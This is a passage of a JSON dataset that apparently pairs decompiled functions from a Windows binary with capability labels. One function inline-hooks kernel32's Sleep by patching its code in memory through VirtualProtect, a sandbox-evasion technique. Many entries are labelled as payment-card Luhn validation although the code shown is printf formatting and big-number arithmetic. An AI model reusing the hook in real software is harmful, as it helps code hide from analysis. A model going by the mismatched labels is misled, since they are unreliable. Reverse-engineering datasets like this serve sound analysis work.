iVar2 && iVar2 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = *puVar5;\n                iVar2 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar2 + 1;\n        if (puVar5 + 1 == arg1 + uVar3) break;\n        uVar1 = *(arg2 + 1);\n        puVar5 = puVar5 + 1;\n    }\ncode_r0x000140002f31:\n    while (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2) {\n        uVar1 = *(arg2 + 1);\ncode_r0x000140002f41:\n        if (((uVar1 & 0x4000) != 0) || (iVar2 = *(arg2 + 0x24),  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n            if ((uVar1 & 0x2000) == 0) {\n                *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                iVar2 = *(arg2 + 0x24);\n            }\n            else {\n                sub.msvcrt.dll_fputc(0x20);\n                iVar2 = *(arg2 + 0x24);\n            }\n        }\n        *(arg2 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 951
    },
    "140003f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140003f10(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    ulong arg2_00;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t auStack28 [3];\n    \n    aStack56[0] = *noname_0;\n    if (*(arg2 + 0x10) < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 7;\n    }\n    else {\n        arg3 = *(arg2 + 0x10) + 1;\n    }\n    arg2_00 = fcn.140002bb0(2, aStack56, arg3, auStack28);\n    if (auStack28[0] != 0xffff8000) {\n        fcn.140003e40(uStack32, arg2_00, auStack28[0], arg2);\n        fcn.140005240(arg2_00);\n        return;\n    }\n    fcn.140003030(uStack32, arg2_00, arg2);\n    fcn.140005240(arg2_00);\n    return;\n}\n",
        "token_count": 266
    },
    "140003fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140003fb0(unkbyte10 *noname_0, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    ulong arg2_00;\n    int32_t iVar2;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t auStack28 [3];\n    \n    arg3 = *(arg2 + 2);\n    aStack56[0] = *noname_0;\n    if (*(arg2 + 2) < 0) {\n        *(arg2 + 2) = 6;\n        arg3 = 6;\n    }\n    arg2_00 = fcn.140002bb0(3, aStack56, arg3, auStack28);\n    if (auStack28[0] == 0xffff8000) {\n        fcn.140003030(uStack32, arg2_00, arg2);\n    }\n    else {\n        fcn.140003a60(uStack32, arg2_00, auStack28[0], arg2);\n        iVar1 = *(arg2 + 0xc);\n        while( true ) {\n            *(arg2 + 0xc) = iVar1 + -1;\n            if (iVar1 < 1) break;\n            if (((*(arg2 + 1) & 0x4000) != 0) ||\n               (iVar2 = *(arg2 + 0x24),  iVar1 = iVar1 + -1,  *(arg2 + 5) != iVar2 && iVar2 <= *(arg2 + 5))) {\n                if ((*(arg2 + 1) & 0x2000) == 0) {\n                    *(*arg2 + *(arg2 + 0x24)) = 0x20;\n                    iVar2 = *(arg2 + 0x24);\n                    iVar1 = *(arg2 + 0xc);\n                }\n                else {\n                    sub.msvcrt.dll_fputc();\n                    iVar2 = *(arg2 + 0x24);\n                    iVar1 = *(arg2 + 0xc);\n                }\n            }\n            *(arg2 + 0x24) = iVar2 + 1;\n        }\n    }\n    fcn.140005240(arg2_00);\n    return;\n}\n",
        "token_count": 499
    },
    "14000409": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004090(unkbyte10 *noname_0, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong arg2_00;\n    uint64_t arg3;\n    unkbyte10 aStack56 [2];\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uVar1 = *(arg2 + 0x10);\n    arg3 = uVar1;\n    aStack56[0] = *noname_0;\n    if (uVar1 < 0) {\n        *(arg2 + 0x10) = 6;\n        arg3 = 6;\n    }\n    else if (uVar1 == 0) {\n        *(arg2 + 0x10) = 1;\n        arg3 = 1;\n    }\n    arg2_00 = fcn.140002bb0(2, aStack56, arg3, &uStack28);\n    if (uStack28 != 0xffff8000) {\n        uVar1 = *(arg2 + 8) & 0x800;\n        if (-4 < uStack28) {\n            if (uStack28 <= *(arg2 + 0x10)) {\n                if (uVar1 == 0) {\n                    iVar2 = sub.msvcrt.dll_strlen();\n                    iVar2 = iVar2 - uStack28;\n                    *(arg2 + 0x10) = iVar2;\n                    if ((iVar2 < 0) && (0 < *(arg2 + 0xc))) {\n                        *(arg2 + 0xc) = iVar2 + *(arg2 + 0xc);\n                    }\n                }\n                else {\n                    *(arg2 + 0x10) = *(arg2 + 0x10) - uStack28;\n                }\n                fcn.140003a60(uStack32, arg2_00, uStack28, arg2);\n                while (iVar2 = *(arg2 + 0xc),  *(arg2 + 0xc) = iVar2 + -1,  0 < iVar2) {\n                    fcn.140002ca0(0x20, arg2);\n                }\n                fcn.140005240(arg2_00);\n                return;\n            }\n        }\n        if (uVar1 == 0) {\n            iVar2 = sub.msvcrt.dll_strlen();\n        }\n        else {\n            iVar2 = *(arg2 + 0x10);\n        }\n        *(arg2 + 0x10) = iVar2 + -1;\n        fcn.140003e40(uStack32, arg2_00, uStack28, arg2);\n        fcn.140005240(arg2_00);\n        return;\n    }\n    fcn.140003030(uStack32, arg2_00, arg2);\n    fcn.140005240(arg2_00);\n    return;\n}\n",
        "token_count": 631
    },
    "140006cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140006cd0(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    \n    puVar4 = arg1 + 0x18;\n    puVar1 = puVar4 + *(arg1 + 0x14);\n    iVar5 = 0;\n    while( true ) {\n        if (puVar1 <= puVar4) {\n            return iVar5;\n        }\n        if (*puVar4 != 0) break;\n        puVar4 = puVar4 + 1;\n        iVar5 = iVar5 + 0x20;\n    }\n    if (puVar1 <= puVar4) {\n        return iVar5;\n    }\n    iVar3 = 0;\n    for (uVar2 = *puVar4; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n        iVar3 = iVar3 + 1;\n    }\n    return iVar5 + iVar3;\n}\n",
        "token_count": 250
    },
    "140006fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140006fa0(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    \n    iVar1 = *(arg1 + 0x14);\n    uVar5 = arg3;\n    iVar3 = 0;\n    do {\n        uVar2 = *(arg1 + 0x18 + iVar3 * 4) * arg2 + uVar5;\n        *(arg1 + 0x18 + iVar3 * 4) = uVar2;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar2 >> 0x20;\n    } while (iVar3 < iVar1);\n    iVar3 = arg1;\n    if (uVar5 != 0) {\n        uVar4 = uVar2 >> 0x20;\n        if (*(arg1 + 0xc) == iVar1 || *(arg1 + 0xc) < iVar1) {\n            iVar3 = fcn.140006e40(*(arg1 + 8) + 1);\n            if (iVar3 != 0) {\n                sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n                fcn.140006f30(arg1);\n                *(iVar3 + 0x18 + iVar1 * 4) = uVar4;\n                *(iVar3 + 0x14) = iVar1 + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x18 + iVar1 * 4) = uVar4;\n            *(arg1 + 0x14) = iVar1 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 412
    },
    "140007a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140007a30(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll___iob_func();\n    return iVar1 + (arg1 & 0xffffffff) * 0x30;\n}\n",
        "token_count": 60
    },
    "140007a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140007a50(uchar *arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint *puVar2;\n    uint16_t auStackX16 [12];\n    int32_t aiStack12 [3];\n    \n    auStackX16[0] = noname_1;\n    if (arg3 == 0) {\n        if (0xff < noname_1) {\ncode_r0x000140007ac4:\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x2a;\n            return 0xffffffff;\n        }\n        *arg1 = noname_1;\n        uVar1 = 1;\n    }\n    else {\n        aiStack12[0] = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(arg3, 0, auStackX16, 1, arg1, arg4, 0, aiStack12);\n        if ((uVar1 == 0) || (aiStack12[0] != 0)) goto code_r0x000140007ac4;\n    }\n    return uVar1;\n}\n",
        "token_count": 267
    },
    "140007d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140007d80(ushort *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg4_00;\n    ushort uStack42;\n    \n    uStack42 = 0;\n    if (arg1 == NULL) {\n        arg1 = &uStack42;\n    }\n    sub.msvcrt.dll____mb_cur_max_func();\n    sub.msvcrt.dll____lc_codepage_func();\n    arg4_00 = 0x140071c38;\n    if (arg4 != 0) {\n        arg4_00 = arg4;\n    }\n    iVar1 = fcn.140007c20(arg1, arg2, arg3, arg4_00);\n    return iVar1;\n}\n",
        "token_count": 173
    },
    "14000817": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.140008170(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    ulong uVar3;\n    \n    fcn.140001b90();\n    fcn.140001a38(0);\n    pcVar2 = _sym.imp.KERNEL32.dll_WaitForSingleObject;\n    pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n    do {\n        uVar3 = (*pcVar1)();\n        (*pcVar2)(uVar3, 10000);\n    } while( true );\n}\n",
        "token_count": 120
    },
    "14000178": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nulong fcn.140001783(void)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    code *pcVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    ushort uStack72;\n    ushort uStack70;\n    uint uStack68;\n    ushort uStack64;\n    uint32_t uStack62;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    puVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    *0x140071060 = 0x10;\n    *0x140071064 = *_sym.imp.KERNEL32.dll_Sleep;\n    *0x140071068 = _sym.imp.KERNEL32.dll_Sleep[1];\n    *0x14007106c = _sym.imp.KERNEL32.dll_Sleep[2];\n    *0x140071070 = _sym.imp.KERNEL32.dll_Sleep[3];\n    uStack62 = uStack62 & 0xff000000 | 0xe2ff41;\n    uStack68 = 0x14000;\n    uStack64 = 0;\n    *0x140071074 = 0x16deba49;\n    *0x140071078 = 0x14000;\n    *0x14007107c = 0xff410000;\n    *0x140071080 = _sym.imp.KERNEL32.dll_Sleep[3] & 0xffffff00 | 0xe2;\n    iVar5 = 0x10;\n    uStack72 = 0;\n    uStack70 = 0;\n    uVar4 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(_sym.imp.KERNEL32.dll_Sleep, 0x10, 0x40, &uStack72);\n    if (uVar4 != 0) {\n        bVar8 = *0x140071088 == NULL;\n        puVar6 = 0x140071074;\n        puVar7 = puVar2;\n        for (; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        if (bVar8) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"ntdll\");\n            *0x140071088 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4, \"NtFlushInstructionCache\");\n        }\n        pcVar1 = *0x140071088;\n        if (*0x140071088 != NULL) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            (*pcVar1)(uVar4, puVar2, 0x10);\n        }\n        (*pcVar3)(puVar2, 0x10, CONCAT22(uStack70, uStack72), &uStack72);\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 676
    },
    "140001da": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.140001da0(ulong arg1, uint8_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    uint32_t *puVar7;\n    code *pcVar8;\n    int32_t iVar9;\n    uint8_t **arg4_00;\n    uint8_t **ppuVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    int32_t *piVar13;\n    uint uVar14;\n    char *arg1_00;\n    uint32_t uVar15;\n    uint64_t arg2_00;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    int64_t iVar18;\n    uint8_t *puVar19;\n    uint8_t **arg1_01;\n    uint8_t **arg3_00;\n    uint32_t uVar20;\n    ulong in_XMM2_Qa;\n    ulong in_XMM3_Qa;\n    uint8_t *puStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack408 [5];\n    uint auStack368 [2];\n    uint64_t uStack360;\n    uchar auStack352 [16];\n    ulong auStack336 [7];\n    uint8_t *apuStack280 [2];\n    uchar auStack264 [12];\n    uchar auStack252 [12];\n    uint8_t **ppuStack240;\n    int64_t iStack232;\n    int64_t iStack224;\n    uint8_t *apuStack144 [3];\n    uint8_t *puStack120;\n    int32_t iStack108;\n    ulong uStack96;\n    uint8_t **ppuStack88;\n    \n    ppuStack88 = &puStackX16;\n    puStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    arg4_00 = fcn.140007a30(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    ppuStack240 = fcn.140007a30(2);\n    arg3_00 = ppuStack88;\n    sub.msvcrt.dll_vfprintf();\n    sub.msvcrt.dll_abort();\n    iStack232 = *0x140071154;\n    uStack96 = arg1;\n    if (*0x140071154 < 1) goto code_r0x000140001f40;\n    arg4_00 = NULL;\n    ppuVar10 = *0x140071158 + 0x18;\n    do {\n        arg3_00 = *ppuVar10;\n        if ((arg3_00 <= ppuStack240) && (arg3_00 = arg3_00 + *(ppuVar10[1] + 8),  ppuStack240 < arg3_00)) {\n            return;\n        }\n        uVar20 = arg4_00 + 1;\n        arg4_00 = uVar20;\n        ppuVar10 = ppuVar10 + 5;\n    } while (uVar20 != *0x140071154);\n    while (iStack224 = fcn.140002860(ppuStack240),  iStack224 != 0) {\n        ppuStack240 = iStack232 * 0x28;\n        puVar11 = *0x140071158 + ppuStack240;\n        *(puVar11 + 8) = iStack224;\n        *puVar11 = 0;\n        iVar12 = fcn.1400029a0();\n        iVar12 = iVar12 + *(iStack224 + 0xc);\n        *(*0x140071158 + 0x18 + ppuStack240) = iVar12;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar12, apuStack144, 0x30);\n        if (iVar12 == 0) {\n            arg3_00 = *(*0x140071158 + 0x18 + ppuStack240);\n            fcn.140001da0(\"  VirtualQuery failed for %d bytes at address %p\", *(iStack224 + 8), arg3_00, arg4_00);\n            break;\n        }\n        if (((iStack108 - 0x40U & 0xffffffbf) == 0) || ((iStack108 - 4U & 0xfffffffb) == 0)) {\ncode_r0x000140001ede:\n            *0x140071154 = *0x140071154 + 1;\n            return;\n        }\n        arg3_00 = 0x40;\n        if (iStack108 == 2) {\n            arg3_00 = 0x4;\n        }\n        ppuStack240 = ppuStack240 + *0x140071158;\n        ppuStack240[1] = apuStack144[0];\n        ppuStack240[2] = puStack120;\n        arg4_00 = ppuStack240;\n        iVar9 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (iVar9 != 0) goto code_r0x000140001ede;\n        uVar20 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.140001da0(\"  VirtualProtect failed with code 0x%x\", uVar20, arg3_00, arg4_00);\ncode_r0x000140001f40:\n        iStack232 = 0;\n    }\n    arg1_00 = \"Address %p has no image-section\";\n    fcn.140001da0(\"Address %p has no image-section\", ppuStack240, arg3_00, arg4_00);\n    iVar9 = *0x140071150;\n    if (*0x140071150 != 0) {\n        return;\n    }\n    *0x140071150 = 1;\n    auStack336[2] = 0x140001fc7;\n    fcn.1400028e0();\n    auStack336[2] = 0x140001fde;\n    iVar12 = fcn.140002b40(arg1_00);\n    iVar17 = *0x14006e760;\n    puVar7 = *0x14006e730;\n    *0x140071154 = 0;\n    iVar12 = -iVar12;\n    *0x140071158 = auStack264 + iVar12;\n    if (*0x14006e730 - *0x14006e740 < 8) {\n        *0x140071154 = 0;\n        return;\n    }\n    puVar16 = *0x14006e740;\n    if (*0x14006e730 - *0x14006e740 < 0xc) {\ncode_r0x00014000201d:\n        if (*puVar16 == 0) {\n            uVar20 = puVar16[1];\ncode_r0x00014000202a:\n            if (uVar20 == 0) {\n                arg2_00 = puVar16[2];\n                if (puVar16[2] != 1) {\ncode_r0x0001400022ce:\n                    uVar14 = 0x4006e280;\n                    *(auStack336 + iVar12 + 0x10) = 0x1400022da;\n                    fcn.140001da0(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2_00, arg3_00, arg4_00);\n                    if (*0x140071160 != NULL) {\n                        uVar5 = *(apuStack280 + iVar12 + 8);\n                        *(auStack368 + iVar12) = uVar14;\n                        *(&uStack360 + iVar12) = arg2_00;\n                        *(auStack352 + iVar12) = CONCAT88(in_XMM3_Qa, in_XMM2_Qa);\n                        *(auStack336 + iVar12) = uVar5;\n                        *(auStack408 + iVar12) = 0x140002318;\n                        (**0x140071160)(auStack368 + iVar12);\n                    }\n                    return;\n                }\n                puVar16 = puVar16 + 3;\n                if (*0x14006e730 <= puVar16) {\n                    *0x140071154 = 0;\n                    return;\n                }\n                do {\n                    while( true ) {\n                        uVar20 = puVar16[2];\n                        ppuVar10 = *puVar16 + iVar17;\n                        arg2_00 = uVar20;\n                        arg4_00 = *ppuVar10;\n                        arg1_01 = puVar16[1] + iVar17;\n                        if ((uVar20 & 0xff) == 0x20) goto code_r0x0001400021f8;\n                        uVar15 = uVar20 & 0xff;\n                        if ((uVar20 & 0xff) < 0x21) break;\n                        if (uVar15 != 0x40) {\ncode_r0x0001400022c2:\n                            *(auStack336 + iVar12 + 0x10) = 0x1400022ce;\n                            fcn.140001da0(\"  Unknown pseudo relocation bit size %d.\\n\", arg2_00, arg3_00, arg4_00);\n                            goto code_r0x0001400022ce;\n                        }\n                        puVar19 = (*arg1_01 - ppuVar10) + arg4_00;\n                        if (((uVar20 & 0xc0) == 0) && (-1 < puVar19)) goto code_r0x0001400021df;\n                        *(auStack336 + iVar12 + 0x10) = 0x140002248;\n                        fcn.140001e10(arg1_01);\n                        *arg1_01 = puVar19;\ncode_r0x0001400020a5:\n                        puVar16 = puVar16 + 3;\n                        if (puVar7 <= puVar16) goto code_r0x000140002140;\n                    }\n                    if (uVar15 == 8) {\n                        uVar2 = *arg1_01;\n                        if (uVar2 < '\\0') {\n                            iVar18 = (uVar2 | 0xffffffffffffff00) - ppuVar10;\n                        }\n                        else {\n                            iVar18 = uVar2 - ppuVar10;\n                        }\n                        puVar19 = iVar18 + arg4_00;\n                        if (((uVar20 & 0xc0) == 0) && ((0xff < puVar19 || (puVar19 < -0x80)))) {\ncode_r0x0001400021df:\n                            do {\n                                *(apuStack280 + iVar12) = puVar19;\n                                uVar20 = 0x4006e2e8;\n                                *(auStack336 + iVar12 + 0x10) = 0x1400021f3;\n                                arg3_00 = arg1_01;\n                                ppuVar10 = fcn.140001da0(\"%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.\\n\"\n                                                         , arg2_00, arg1_01, arg4_00);\ncode_r0x0001400021f8:\n                                uVar15 = *arg1_01;\n                                if (uVar15 < 0) {\n                                    iVar18 = (uVar15 | 0xffffffff00000000) - ppuVar10;\n                                }\n                                else {\n                                    iVar18 = uVar15 - ppuVar10;\n                                }\n                                puVar19 = iVar18 + arg4_00;\n                            } while (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x80000000 || (0xffffffff < puVar19))));\n                            *(auStack336 + iVar12 + 0x10) = 0x140002232;\n                            fcn.140001e10(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        else {\n                            *(auStack336 + iVar12 + 0x10) = 0x1400020a2;\n                            fcn.140001e10(arg1_01);\n                            *arg1_01 = puVar19;\n                        }\n                        goto code_r0x0001400020a5;\n                    }\n                    if (uVar15 != 0x10) goto code_r0x0001400022c2;\n                    uVar3 = *arg1_01;\n                    if (uVar3 < 0) {\n                        iVar18 = (uVar3 | 0xffffffffffff0000) - ppuVar10;\n                    }\n                    else {\n                        iVar18 = uVar3 - ppuVar10;\n                    }\n                    puVar19 = iVar18 + arg4_00;\n                    if (((uVar20 & 0xc0) == 0) && ((puVar19 < -0x8000 || (0xffff < puVar19))))\n                    goto code_r0x0001400021df;\n                    puVar16 = puVar16 + 3;\n                    *(auStack336 + iVar12 + 0x10) = 0x14000212c;\n                    fcn.140001e10(arg1_01);\n                    *arg1_01 = puVar19;\n                } while (puVar16 < puVar7);\n                goto code_r0x000140002140;\n            }\n        }\n    }\n    else if (**0x14006e740 == 0) {\n        uVar20 = (*0x14006e740)[1];\n        if ((uVar20 | (*0x14006e740)[2]) == 0) {\n            puVar16 = *0x14006e740 + 3;\n            goto code_r0x00014000201d;\n        }\n        goto code_r0x00014000202a;\n    }\n    if (*0x14006e730 <= puVar16) {\n        *0x140071154 = 0;\n        return;\n    }\n    do {\n        puVar1 = puVar16 + 1;\n        uVar20 = *puVar16;\n        puVar16 = puVar16 + 2;\n        piVar13 = *puVar1 + iVar17;\n        iVar4 = *piVar13;\n        *(auStack336 + iVar12 + 0x10) = 0x1400022b6;\n        fcn.140001e10(piVar13);\n        *piVar13 = uVar20 + iVar4;\n    } while (puVar16 < puVar7);\ncode_r0x000140002140:\n    pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    if (0 < *0x140071154) {\n        iVar17 = 0;\n        do {\n            piVar13 = *0x140071158 + iVar17;\n            iVar4 = *piVar13;\n            if (iVar4 != 0) {\n                uVar5 = *(piVar13 + 4);\n                uVar6 = *(piVar13 + 2);\n                *(auStack336 + iVar12 + 0x10) = 0x14000217f;\n                (*pcVar8)(uVar6, uVar5, iVar4, auStack252);\n            }\n            iVar9 = iVar9 + 1;\n            iVar17 = iVar17 + 0x28;\n        } while (iVar9 < *0x140071154);\n    }\n    return;\n}\n",
        "token_count": 3416
    }
}